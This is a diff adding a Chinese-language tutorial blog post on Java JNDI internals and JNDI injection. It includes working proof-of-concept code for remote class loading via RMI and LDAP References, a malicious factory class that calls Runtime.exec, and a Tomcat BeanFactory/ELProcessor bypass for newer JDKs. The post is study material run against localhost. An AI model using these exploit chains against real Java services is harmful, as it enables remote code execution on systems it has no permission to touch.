+    public String sayHello(String keywords) throws RemoteException {
+        String upkeywords = keywords.toUpperCase();
+        System.out.println(upkeywords);
+        return upkeywords;
+    }
+
+   
+}
+</code></pre>
+<h3 id="rmi服务端">RMI服务端：</h3>
+<pre><code class="language-java">package org.example;
+import java.rmi.Naming;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.server.UnicastRemoteObject;
+
+public class RMIServer {
+    public static void main(String[] args) throws RemoteException, AlreadyBoundException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, MalformedURLException {
+
+
+        Registry registry = LocateRegistry.createRegistry(1099);
+        Remoteobj remoteobj = new RemoteobjImpl();
+       
+        Naming.bind(&quot;Bloyet&quot;, remoteobj);
+    }
+</code></pre>
+<h3 id="客户端">客户端：</h3>
+<pre><code class="language-java">package org.example;
+
+import javax.naming.Context;
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+import java.rmi.RemoteException;
+
+
+public class JNDI {
+    public static void main(String[] args) throws NamingException, RemoteException {
+       Hashtable&lt;String, String&gt; env = new Hashtable&lt;&gt;();
+        env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
+        env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);
+        
+        //初始化上下文
+        Context initialContext = new InitialContext(env);
+ 
+        //调用远程类
+        Remoteobj remoteobj = (Remoteobj) context.lookup(&quot;Bloyet&quot;);
+        remoteobj.sayHello(&quot;Hello World&quot;);
+
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://bloyet.github.io/post-images/1749492628865.png" alt="" loading="lazy"></figure>
+<h2 id="jndi-dns">JNDI + DNS</h2>
+<p>我们通过JNDI成功地调用了RMI和DNS服务。那么对于JNDI来讲，它是如何识别我们调用的是何种服务呢？这就依赖于我们上面提到的Context（上下文）了。</p>
+<h1 id="jndi的工作流程">JNDI的工作流程</h1>
+<p>我们就拿我们熟悉一点的RMI举例：</p>
+<pre><code class="language-java">        //设置JNDI环境变量
+        Hashtable&lt;String, String&gt; env = new Hashtable&lt;&gt;();
+        env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
+        env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);
+        
+        //初始化上下文
+        Context initialContext = new InitialContext(env);
+</code></pre>
+<p>首先使用<code>Hashtable</code>类来设置属性<code>*INITIAL_CONTEXT_FACTORY*</code>和<code>*PROVIDER_URL*</code>的值。可以看到，这里我们将<code>*INITIAL_CONTEXT_FACTORY*</code>设置为了<code>&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</code>，JNDI正是通过这一属性来判断我们将要调用何种服务。</p>
+<p>接着我们将属性<code>PROVIDER_URL</code>设置为了<code>&quot;rmi://localhost:1099&quot;</code>，这正是我们RMI服务的地址。JNDI通过该属性来获取服务的路径，进而调用该服务。</p>
+<p>最后向<code>InitialContext</code>类传入我们设置的属性值来初始化一个<code>Context</code>，于是我们就获得了一个与RMI服务相关联的上下文<code>Context</code>。</p>
+<p>当然 与RMI一样，Context同样通过以下五种方法来与被调用的服务进行交互</p>
+<pre><code class="language-java">//将名称绑定到对象
+bind(Name name, Object obj)
+ 
+//枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名
+list(String name) 
+ 
+//检索命名对象
+lookup(String name)
+ 
+//将名称重绑定到对象 
+rebind(String name, Object obj) 
+ 
+//取消绑定命名对象
+unbind(String name) 
+</code></pre>
+<h1 id="jndi底层代码实现">JNDI底层代码实现</h1>
+<h2 id="获取工厂类">获取工厂类</h2>
+<p>断点打在这里</p>
+<figure data-type="image" tabindex="3"><img src="https://bloyet.github.io/post-images/1749492628881.png" alt="" loading="lazy"></figure>
+<p>进入构造函数，调用init函数</p>
+<figure data-type="image" tabindex="4"><img src="https://bloyet.github.io/post-images/1749492628896.png" alt="" loading="lazy"></figure>
+<p>获取环境变量，以及刚刚我们在hashtable中设置的环境变量，然后继续调用getDefaultInitCtx()方法</p>
+<figure data-type="image" tabindex="5"><img src="https://bloyet.github.io/post-images/1749492628927.png" alt="" loading="lazy"></figure>
+<p>调用NamingManager 的 <code>getInitialContext</code>方法，跟进</p>
+<figure data-type="image" tabindex="6"><img src="https://bloyet.github.io/post-images/1749492628943.png" alt="" loading="lazy"></figure>
+<pre><code class="language-java">public static Context getInitialContext(Hashtable&lt;?,?&gt; env)
+    throws NamingException {
+    InitialContextFactory factory;
+
+    InitialContextFactoryBuilder builder = getInitialContextFactoryBuilder();
+    if (builder == null) {
+        // No factory installed, use property
+        // Get initial context factory class name
+
+        String className = env != null ?
+            (String)env.get(Context.INITIAL_CONTEXT_FACTORY) : null;
+        if (className == null) {
+            NoInitialContextException ne = new NoInitialContextException(
+                &quot;Need to specify class name in environment or system &quot; +
+                &quot;property, or as an applet parameter, or in an &quot; +
+                &quot;application resource file:  &quot; +
+                Context.INITIAL_CONTEXT_FACTORY);
+            throw ne;
+        }
+
+        try {
+            factory = (InitialContextFactory)
+                helper.loadClass(className).newInstance();
+        } catch(Exception e) {
+            NoInitialContextException ne =
+                new NoInitialContextException(
+                    &quot;Cannot instantiate class: &quot; + className);
+            ne.setRootCause(e);
+            throw ne;
+        }
+    } else {
+        factory = builder.createInitialContextFactory(env);
+    }
+
+    return factory.getInitialContext(env);
+}
+</code></pre>
+<p>这里首先通过<code>getInitialContextFactoryBuilder()</code>初始化了一个<code>InitialContextFactoryBuilder</code>类。如果该类为空，则将<code>className</code>设置为<code>*INITIAL_CONTEXT_FACTORY*</code>属性。还记得该属性是什么吗？就是我们手动设置的RMI上下文工厂类<code>com.sun.jndi.rmi.registry.RegistryContextFactory</code>       这里发现就是判断为空了，进入if语句  对classname进行赋值</p>
+<figure data-type="image" tabindex="7"><img src="https://bloyet.github.io/post-images/1749492628959.png" alt="" loading="lazy"></figure>
+<p>接着往下看</p>
+<p>这里通过<code>loadClass()</code>来动态加载我们设置的工厂类。最终调用的其实是<code>RegistryContextFactory#getInitialContext()</code>方法，通过我们的设置工厂类来初始化上下文Context</p>
+<figure data-type="image" tabindex="8"><img src="https://bloyet.github.io/post-images/1749492628974.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://bloyet.github.io/post-images/1749492628990.png" alt="" loading="lazy"></figure>
+<h2 id="获取服务交互所需资源">获取服务交互所需资源</h2>
+<p>现在JNDI知道了我们想要调用何种服务，那么它又是如何知道服务地址以及获取服务的各种资源的呢？ 还是在刚刚那里，我们接着看</p>
+<pre><code class="language-java">RegistryContextFactory#getInitialContext()
+public Context getInitialContext(Hashtable&lt;?, ?&gt; var1) throws NamingException {
+    if (var1 != null) {
+        var1 = (Hashtable)var1.clone();
+    }
+
+    return URLToContext(getInitCtxURL(var1), var1);
+}
+</code></pre>
+<p>var1 就是我们设置的环境 ，先跟进getInitCtxURL</p>
+<p>JNDI通过我们设置的<code>*PROVIDER_URL*</code>环境变量来获取服务的路径</p>
+<figure data-type="image" tabindex="10"><img src="https://bloyet.github.io/post-images/1749492629006.png" alt="" loading="lazy"></figure>
+<p>继续看 URLToContext</p>
+<p>初始化了一个new rmiURLContextFactory(); 然后调用了rmiURLContextFactory#getObjectInstance方法，跟进</p>
+<pre><code class="language-java">private static Context URLToContext(String var0, Hashtable&lt;?, ?&gt; var1) throws NamingException {
+    rmiURLContextFactory var2 = new rmiURLContextFactory();
+    Object var3 = var2.getObjectInstance(var0, (Name)null, (Context)null, var1);
+    if (var3 instanceof Context) {
+        return (Context)var3;
+    } else {
+        throw new NotContextException(var0);
+    }
+}
+</code></pre>
+<p>var1 不为空  进入第二个if 调用getUsingURL 方法，跟进</p>
+<figure data-type="image" tabindex="11"><img src="https://bloyet.github.io/post-images/1749492629022.png" alt="" loading="lazy"></figure>
+<p>发现调用了lookup方法，那就跟进看看</p>
+<figure data-type="image" tabindex="12"><img src="https://bloyet.github.io/post-images/1749492629037.png" alt="" loading="lazy"></figure>
+<p>rmiURLContext本身没有lookup方法，调用到了父类的lookup方法</p>
+<p>执行 getRootURLContext()方法获取解析结果，结果为图二，通过 getResolvedObj 方法取出 RegistryContext，然后继续调用lookup方法</p>
+<figure data-type="image" tabindex="13"><img src="https://bloyet.github.io/post-images/1749492629068.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="14"><img src="https://bloyet.github.io/post-images/1749492629053.png" alt="" loading="lazy"></figure>
+<p>RegistryContext#lookup</p>
+<p>进入if语句 ，返回   一个RegistryContext新的实例，在实例化的时候，把信息也传好了</p>
+<figure data-type="image" tabindex="15"><img src="https://bloyet.github.io/post-images/1749492629084.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://bloyet.github.io/post-images/1749492629101.png" alt="" loading="lazy"></figure>
+<p>流程：</p>
+<figure data-type="image" tabindex="17"><img src="https://bloyet.github.io/post-images/1749492629116.png" alt="" loading="lazy"></figure>
+<h1 id="jndi动态协议转换">JNDI动态协议转换</h1>
+<p>实际上，在 Context#lookup()方法的参数中，用户可以指定自己的查找协议。JNDI会通过用户的输入来动态的识别用户要调用的服务以及路径。来看下面的例子</p>
+<p>客户端：</p>
+<pre><code class="language-java">package org.example;
+import javax.naming.Context;
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+import java.rmi.RemoteException;
+
+public class JNDI {
+    public static void main(String[] args) throws NamingException, RemoteException {
+      
+        String string = &quot;rmi://localhost:1099/Bloyet&quot;;
+        //初始化上下文
+        Context context = new InitialContext();
+
+        //调用远程类
+        Remoteobj remoteobj = (Remoteobj) context.lookup(string);
+        remoteobj.sayHello(&quot;Hello World&quot;);
+
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="18"><img src="https://bloyet.github.io/post-images/1749492629132.png" alt="" loading="lazy"></figure>
+<p>可以看到，我们并没有设置相应的环境变量来初始化Context，但是JNDI仍旧通过lookup()的参数识别出了我们要调用的服务以及路径，这就是JNDI的动态协议转换。</p>
+<h1 id="jndi动态协议转换底层分析">JNDI动态协议转换底层分析</h1>
+<p>断点打在</p>
+<figure data-type="image" tabindex="19"><img src="https://bloyet.github.io/post-images/1749492629147.png" alt="" loading="lazy"></figure>
+<p>发现不管是调用lookup、bind或者是其他<code>initalContext</code>中的方法，都会先调用<code>getURLOrDefaultInitCtx()</code>方法进行检查。</p>
+<figure data-type="image" tabindex="20"><img src="https://bloyet.github.io/post-images/1749492629163.png" alt="" loading="lazy"></figure>
+<p>先跟进getURLOrDefaultInitCtx()方法</p>
+<p>会调用getURLScheme方法来获取通信的协议，这里获取到的就是rmi协议，然后把获取到的协议作为参数，调用getURLContext方法</p>
+<pre><code class="language-java">protected Context getURLOrDefaultInitCtx(String name)
+    throws NamingException {
+    if (NamingManager.hasInitialContextFactoryBuilder()) {
+        return getDefaultInitCtx();
+    }
+    String scheme = getURLScheme(name);
+    if (scheme != null) {
+        Context ctx = NamingManager.getURLContext(scheme, myProps);
+        if (ctx != null) {
+            return ctx;
+        }
+    }
+    return getDefaultInitCtx();
+}
+</code></pre>
+<figure data-type="image" tabindex="21"><img src="https://bloyet.github.io/post-images/1749492629179.png" alt="" loading="lazy"></figure>
+<p>跟进到NamingManager.getURLContext方法</p>
+<p>调用getURLObject，继续跟进</p>
+<figure data-type="image" tabindex="22"><img src="https://bloyet.github.io/post-images/1749492629195.png" alt="" loading="lazy"></figure>
+<p>getURLObject()方法</p>
+<p>根据defaultPkgPrefix的属性来动态生成<code>Factory</code>类</p>
+<pre><code class="language-java">private static Object getURLObject(String scheme, Object urlInfo,
+                                   Name name, Context nameCtx,
+                                   Hashtable&lt;?,?&gt; environment)
+        throws NamingException {
+
+    // e.g. &quot;ftpURLContextFactory&quot;
+    ObjectFactory factory = (ObjectFactory)ResourceManager.getFactory(
+        Context.URL_PKG_PREFIXES, environment, nameCtx,
+        &quot;.&quot; + scheme + &quot;.&quot; + scheme + &quot;URLContextFactory&quot;, defaultPkgPrefix);
+
+    if (factory == null)
+      return null;
+
+    // Found object factory
+    try {
+        return factory.getObjectInstance(urlInfo, name, nameCtx, environment);
+    } catch (NamingException e) {
+        throw e;
+    } catch (Exception e) {
+        NamingException ne = new NamingException();
+        ne.setRootCause(e);
+        throw ne;
+    }
+
+}
+</code></pre>
+<figure data-type="image" tabindex="23"><img src="https://bloyet.github.io/post-images/1749492629211.png" alt="" loading="lazy"></figure>
+<p>只要是这个包下的都是可以进行转换的协议</p>
+<figure data-type="image" tabindex="24"><img src="https://bloyet.github.io/post-images/1749492629226.png" alt="" loading="lazy"></figure>
+<p>通过动态协议转换，我们可以仅通过一串特定字符串就可以指定JNDI调用何种服务，十分方便。但是方便是会付出一定代价的。对于一个系统来讲，往往越方便，就越不安全。</p>
+<p>假如我们能够控制<code>string</code>字段，那么就可以搭建恶意服务，并控制JNDI接口访问该恶意，于是将导致恶意的远程class文件加载，从而导致远程代码执行。这种攻击手法其实就是JNDI注入，它和RMI服务攻击手法中的”远程加载CodeBase”较为类似，都是通过一些远程通信来引入恶意的class文件，进而导致代码执行。</p>
+<h1 id="jndi-refernce-类">JNDI-Refernce 类</h1>
+<p>Reference类表示对存在于命名/目录系统以外的对象的引用，比如远程获取 RMI 服务上的对象是 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载class文件来进行实例化</p>
+<p>有点像是RMI中Codebase的功能，在JNDI中我们可以利用Refernce进行调用远程服务器的类</p>
+<p>Reference类构造函数</p>
+<p>它的构造函数很多，这里就列举一种</p>
+<pre><code class="language-java">Reference(String className,  String factory, String factoryLocation) 
+</code></pre>
+<p>className为远程加载时所使用的类名，如果本地找不到这个类名，就去远程加载</p>
+<p>factory为工厂类名</p>
+<p>factoryLocation为工厂类加载的地址，可以是file://、ftp://、http:// 等协议</p>
+<p>在RMI中，由于我们远程加载的对象需要继承<code>UnicastRemoteObject</code>类，所以这里我们需要使用ReferenceWrapper类对Reference类或其子类对象进行远程包装成Remote类使其能够被远程访问。</p>
+<h1 id="jndi注入">JNDI注入</h1>
+<p>大概的思路就是：</p>
+<p>受害者先向服务器请求一个Reference类，服务器返回一个Reference类，其中指明了需要创建的类，创建该类的工厂类，以及工厂类的地址</p>
+<p>然后受害者尝试在本地加载指定的工厂类，发现没有，就会对指定远程地址去进行下载，然后远处返回一个恶意字节码，受害者接受字节码</p>
+<p>将返回的字节码实例化，导致RCE</p>
+<figure data-type="image" tabindex="25"><img src="https://bloyet.github.io/post-images/1749492629242.png" alt="" loading="lazy"></figure>
+<h2 id="jndirmi-2">JNDI+RMI</h2>
+<p>服务端：</p>
+<pre><code class="language-java">package org.example;
+
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+
+import javax.naming.Reference;
+import java.rmi.Naming;
+import java.rmi.registry.LocateRegistry;
+
+public class JNDI_server {
+    public static void main(String[] args) throws Exception {
+        LocateRegistry.createRegistry(1099);
+        Reference reference=new Reference(&quot;RMIHello&quot;,&quot;RMIHello&quot;,&quot;http://127.0.0.1:8000/&quot;);
+        ReferenceWrapper referenceWrapper=new ReferenceWrapper(reference);
+        Naming.bind(&quot;rmi://127.0.0.1:1099/Bloyet&quot;,referenceWrapper);
+    }
+}
+</code></pre>
+<p>工厂类（恶意类）</p>
+<pre><code class="language-java">import javax.naming.Context;
+import javax.naming.Name;
+import javax.naming.spi.ObjectFactory;
+import java.io.IOException;
+import java.rmi.server.UnicastRemoteObject;
+import java.util.Hashtable;
+
+public class RMIHello extends UnicastRemoteObject implements ObjectFactory {
+
+    public RMIHello() throws IOException {
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+    }
+
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception {
+        return null;
+    }
+}
+</code></pre>
+<p>客户端：</p>
+<pre><code class="language-java">package org.example;
+
+import javax.naming.Context;
+import javax.naming.InitialContext;
+
+
+public class JNDI {
+    public static void main(String[] args) throws Exception {
+     
+        String string = &quot;rmi://localhost:1099/Bloyet&quot;;
+        //初始化上下文
+        Context context = new InitialContext();
+
+        //调用远程类
+        context.lookup(string);
+      
+
+    }
+}
+</code></pre>
+<p>利用python起个简单的http服务，然后启动服务端，在启动客户端。</p>
+<p>注意点：</p>
+<p>我们的工厂类最好是直接放在主目录下，不要放在模块下面，不然会提示找不到文件</p>
+<figure data-type="image" tabindex="26"><img src="https://bloyet.github.io/post-images/1749492629273.png" alt="" loading="lazy"></figure>
+<p>成功弹出计算器</p>
+<figure data-type="image" tabindex="27"><img src="https://bloyet.github.io/post-images/1749492629259.png" alt="" loading="lazy"></figure>
+<h3 id="流程分析">流程分析</h3>
+<p>JNDI 的动态协议转化导致我们能够从 Reference 类中读取地址，从恶意地址中获取恶意工厂类字节码内容，然后在本地进行实例化导致RCE</p>
+<p>下面看具体代码</p>
+<p>断点打在客户端</p>
+<figure data-type="image" tabindex="28"><img src="https://bloyet.github.io/post-images/1749492629290.png" alt="" loading="lazy"></figure>
+<p>跟进getURLOrDefaultInitCtx</p>
+<figure data-type="image" tabindex="29"><img src="https://bloyet.github.io/post-images/1749492629307.png" alt="" loading="lazy"></figure>
+<p>这里因为 URL 传值中制定了 RMI 协议，所以这里的 scheme 取出来是”RMI”，进入 if 判断完毕之后的内容，通过 NamingManager 的 getURLContext 的方法来获取 context，跟进</p>
+<figure data-type="image" tabindex="30"><img src="https://bloyet.github.io/post-images/1749492629321.png" alt="" loading="lazy"></figure>
+<p>只有一个getURLObject方法，跟进</p>
+<figure data-type="image" tabindex="31"><img src="https://bloyet.github.io/post-images/1749492629367.png" alt="" loading="lazy"></figure>
+<p>根据 scheme 的值构造出了 rmiURLContext 的构造实体 factory，然后调用factory.getObjectInstance，继续跟进</p>
+<figure data-type="image" tabindex="32"><img src="https://bloyet.github.io/post-images/1749492629382.png" alt="" loading="lazy"></figure>
+<p>工厂类来获取 rmiURLContext 的内容，返回一个rmiURLContext实例</p>
+<figure data-type="image" tabindex="33"><img src="https://bloyet.github.io/post-images/1749492629397.png" alt="" loading="lazy"></figure>
+<p>然后getURLOrDefaultInitCtx这一部分看完了，现在看lookup这一部分</p>
+<figure data-type="image" tabindex="34"><img src="https://bloyet.github.io/post-images/1749492629413.png" alt="" loading="lazy"></figure>
+<p>rmiURLContext 本身没有 lookup 方法的定义，跟进到 GenericURLContext 的 lookup 方法</p>
+<p>getRootURLContext 方法和getResolvedObj都是为了去获得RegistryContext，然后调用RegistryContext.lookup方法</p>
+<p>继续跟进</p>
+<figure data-type="image" tabindex="35"><img src="https://bloyet.github.io/post-images/1749492629429.png" alt="" loading="lazy"></figure>
+<p>然后这一部分就比较熟悉了，走到了RegistryImpl_Stub 部分了</p>
+<p>从远程客户端上请求字节码了，最后调用 decodeObeject 进行实例化，跟进decodeObeject方法</p>
+<figure data-type="image" tabindex="36"><img src="https://bloyet.github.io/post-images/1749492629444.png" alt="" loading="lazy"></figure>
+<p>跟进getObjectInstance</p>
+<figure data-type="image" tabindex="37"><img src="https://bloyet.github.io/post-images/1749492629460.png" alt="" loading="lazy"></figure>
+<p>跟进getObjectFactoryFromReference方法</p>
+<figure data-type="image" tabindex="38"><img src="https://bloyet.github.io/post-images/1749492629476.png" alt="" loading="lazy"></figure>
+<p>在这个方法中，调用了loadClass方法 加载字节码</p>
+<figure data-type="image" tabindex="39"><img src="https://bloyet.github.io/post-images/1749492629492.png" alt="" loading="lazy"></figure>
+<h2 id="jndildap">JNDI+LDAP</h2>
+<h3 id="ldap简介">LDAP简介</h3>
+<p>LDAP（Lightweight Directory Access Protocol ，轻型目录访问协议）是一种目录服务协议，运行在TCP/IP堆栈之上。LDAP目录服务是由目录数据库和一套访问协议组成的系统，目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，能进行查询、浏览和搜索，以树状结构组织数据。LDAP目录服务基于客户端-服务器模型，它的功能用于对一个存在目录数据库的访问。 LDAP目录和RMI注册表的区别在于是前者是目录服务，并允许分配存储对象的属性。</p>
+<p>也就是说，LDAP <strong>「是一个协议」</strong>，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容。而 <strong>「LDAP 协议的实现」</strong>，有着众多版本，例如微软的 Active Directory 是 LDAP 在 Windows 上的实现。AD 实现了 LDAP 所需的树形数据库、具体如何解析请求数据并到数据库查询然后返回结果等功能。再例如 OpenLDAP 是可以运行在 Linux 上的 LDAP 协议的开源实现。而我们平常说的 LDAP Server，一般指的是安装并配置了 Active Directory、OpenLDAP 这些程序的服务器。</p>
+<p>在LDAP中，我们是通过目录树来访问一条记录的，目录树的结构如下</p>
+<pre><code class="language-java">dn ：一条记录的详细位置
+dc ：一条记录所属区域    (哪一颗树)
+ou ：一条记录所属组织    （哪一个分支）
+cn/uid：一条记录的名字/ID   (哪一个苹果名字)
+...
+LDAP目录树的最顶部就是根，也就是所谓的“基准DN&quot;。
+</code></pre>
+<p>我们也可以使用LDAP服务来存储Java对象，如果我们此时能够控制JNDI去访问存储在LDAP中的Java恶意对象，那么就有可能达到攻击的目的。LDAP能够存储的Java对象如下</p>
+<ul>
+<li>Java 序列化</li>
+<li>JNDI的References</li>
+<li>Marshalled对象</li>
+<li>Remote Location</li>
+</ul>
+<h3 id="复现代码">复现代码</h3>
+<h4 id="环境配置">环境配置</h4>
+<p>先需要导入<a href="https://repo.maven.apache.org/maven2/com/unboundid/unboundid-ldapsdk/3.2.0/unboundid-ldapsdk-3.2.0.jar">unboundid依赖库</a></p>
+<p>然后在项目结构中导入</p>
+<figure data-type="image" tabindex="40"><img src="https://bloyet.github.io/post-images/1749492629336.png" alt="" loading="lazy"></figure>
+<h4 id="代码">代码</h4>
+<p>先写个LDAP服务端：（直接AI就行）</p>
+<pre><code class="language-java">package org.example;
+import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import javax.net.ServerSocketFactory;
+import javax.net.SocketFactory;
+import javax.net.ssl.SSLSocketFactory;
+import java.io.IOException;
+import java.net.InetAddress;
+
+public class LDAP_server {
+    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;
+    public static void main(String[] args) throws IOException {
+        int port = 10389;
+        try {
+            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
+            config.setListenerConfigs(new InMemoryListenerConfig(
+                    &quot;listen&quot;, //$NON-NLS-1$
+                    InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$
+                    port,
+                    ServerSocketFactory.getDefault(),
+                    SocketFactory.getDefault(),
+                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
+            config.setSchema(null);
+            config.setEnforceAttributeSyntaxCompliance(false);
+            config.setEnforceSingleStructuralObjectClass(false);
+            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
+            ds.add(&quot;dn: &quot; + &quot;dc=example,dc=com&quot;, &quot;objectClass: top&quot;, &quot;objectclass: domain&quot;);
+            ds.add(&quot;dn: &quot; + &quot;ou=employees,dc=example,dc=com&quot;, &quot;objectClass: organizationalUnit&quot;, &quot;objectClass: top&quot;);
+            ds.add(&quot;dn: &quot; + &quot;uid=longofo,ou=employees,dc=example,dc=com&quot;, &quot;objectClass: ExportObject&quot;);
+
+            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); //$NON-NLS-1$
+            ds.startListening();
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<p>EXP（把恶意类放到服务端去）</p>
+<pre><code class="language-java">package org.example;
+import javax.naming.InitialContext;
+import javax.naming.Reference;
+
+public class LDAP_EXP {
+    public static void main(String[] args) throws Exception {
+        InitialContext initialContext =new InitialContext();
+        Reference reference =new Reference(&quot;RMIHello&quot;,&quot;RMIHello&quot;,&quot;http://localhost:8000/&quot;);
+        initialContext.rebind(&quot;ldap://localhost:10389/cn=TestLdap,dc=example,dc=com&quot;,reference);
+    }
+}
+</code></pre>
+<p>客户端：</p>
+<pre><code class="language-java">package org.example;
+
+import javax.naming.InitialContext;
+
+public class LDAP_C {
+    public static void main(String[] args) throws Exception {
+        String string = &quot;ldap://localhost:10389/cn=TestLdap,dc=example,dc=com&quot;;
+
+        InitialContext initialContext = new InitialContext();
+        initialContext.lookup(string);
+    }
+}
+</code></pre>
+<p>结果</p>
+<p>先开启python服务，然后打开LDAP服务端，然后在运行EXP把恶意类放上去，然后在运行客户端，成功实现类加载</p>
+<figure data-type="image" tabindex="41"><img src="https://bloyet.github.io/post-images/1749492629351.png" alt="" loading="lazy"></figure>
+<h3 id="流程分析-2">流程分析</h3>
+<p>整体和 RMI 很相似，我们断点依旧打在</p>
+<p>步入</p>
+<figure data-type="image" tabindex="42"><img src="https://bloyet.github.io/post-images/1749492629507.png" alt="" loading="lazy"></figure>
+<p>这里我们就不看getURLOrDefaultInitCtx(name)这一部分了，直接跟进lookup方法</p>
+<figure data-type="image" tabindex="43"><img src="https://bloyet.github.io/post-images/1749492629523.png" alt="" loading="lazy"></figure>
+<p>调用父类的lookup方法</p>
+<figure data-type="image" tabindex="44"><img src="https://bloyet.github.io/post-images/1749492629539.png" alt="" loading="lazy"></figure>
+<p>前面是一样获得LdapCtx 然后在调用lookup方法</p>
+<figure data-type="image" tabindex="45"><img src="https://bloyet.github.io/post-images/1749492629554.png" alt="" loading="lazy"></figure>
+<p>ldapCtx 本身是没有 lookup 方法，还是得调它的父类</p>
+<p>这里先跟进p_lookup方法</p>
+<figure data-type="image" tabindex="46"><img src="https://bloyet.github.io/post-images/1749492629570.png" alt="" loading="lazy"></figure>
+<p>然后又调用了c_lookup方法，跟进</p>
+<figure data-type="image" tabindex="47"><img src="https://bloyet.github.io/post-images/1749492629586.png" alt="" loading="lazy"></figure>
+<p>然后在调用getObjectInstance方法，跟进</p>
+<figure data-type="image" tabindex="48"><img src="https://bloyet.github.io/post-images/1749492629602.png" alt="" loading="lazy"></figure>
+<p>然后继续调用getObjectFactoryFromReference，跟进</p>
+<figure data-type="image" tabindex="49"><img src="https://bloyet.github.io/post-images/1749492629618.png" alt="" loading="lazy"></figure>
+<p>在这里进行加载字节码</p>
+<figure data-type="image" tabindex="50"><img src="https://bloyet.github.io/post-images/1749492629633.png" alt="" loading="lazy"></figure>
+<h1 id="jndi高版本怎么实现绕过">JNDI高版本怎么实现绕过</h1>
+<h2 id="源码对比">源码对比：</h2>
+<p>在低版本JDK_8u65下，在<code>RegistryContext#decodeObject()</code>方法会直接调用到<code>NamingManager#getObjectInstance()</code>，进而调用<code>getObjectFactoryFromReference()</code>方法来获取远程工厂类</p>
+<figure data-type="image" tabindex="51"><img src="https://bloyet.github.io/post-images/1749492629648.png" alt="" loading="lazy"></figure>
+<p>JDK_8u241</p>
+<figure data-type="image" tabindex="52"><img src="https://bloyet.github.io/post-images/1749492629664.png" alt="" loading="lazy"></figure>
+<p>增加了一层类型检查以及<code>trustURLCodebase</code>的检查。基本上远程 codebase 都不会被允许加载了，</p>
+<p>但是我们可以通过本地加载去绕过它，我觉得用本地解析 更准确。原理是服务器传递了一个客户端可以进行本地解析的类，然后客户端用已有的组件进行了解析，导致了RCE</p>
+<h2 id="绕过限制">绕过限制</h2>
+<p>该本地工厂类必须实现<code>javax.naming.spi.ObjectFactory</code>接口,因为在<code>javax.naming.spi.NamingManager#getObjectFactoryFromReference</code>最后的<code>return</code>语句对<code>Factory</code>类的实例对象进行了类型转换，并且该工厂类至少存在一个<code>getObjectInstance()</code>方法</p>
+<p><code>org.apache.naming.factory.BeanFactory</code>就是满足条件之一，并由于该类存在于Tomcat8依赖包中，攻击面和成功率还是比较高的。</p>
+<p><code>BeanFactory</code> 在 <code>getObjectInstance()</code>会通过参数指定进行类加载，如何这个类是可以进行命令执行的，那就能RCE了</p>
+<p>但是这里还有一个类型判断（是否为ResourceRef，是就可以进行类加载了），我们还得对它进行包装一下</p>
+<figure data-type="image" tabindex="53"><img src="https://bloyet.github.io/post-images/1749492629680.png" alt="" loading="lazy"></figure>
+<h2 id="复现">复现</h2>
+<p>环境：</p>
+<p>先导入对应的依赖</p>
+<pre><code class="language-java">&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
+    &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;
+    &lt;version&gt;8.5.0&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
+    &lt;artifactId&gt;tomcat-jasper-el&lt;/artifactId&gt;
+    &lt;version&gt;8.5.0&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>服务端：</p>
+<pre><code class="language-java">package org.example;
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+import org.apache.naming.ResourceRef;
+import javax.naming.StringRefAddr;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class RMI_server_bypass {
+    public static void main(String[] args) throws Exception {
+        Registry registry = LocateRegistry.createRegistry(1099);
+        ResourceRef resourceRef = new ResourceRef(&quot;javax.el.ELProcessor&quot;, (String)null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, (String)null);
+        resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;faster=eval&quot;));
+        resourceRef.add(new StringRefAddr(&quot;faster&quot;, &quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;));
+        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
+        registry.bind(&quot;Bloyet&quot;, referenceWrapper);
+        System.out.println(&quot;Registry运行中......&quot;);
+
+    }
+}
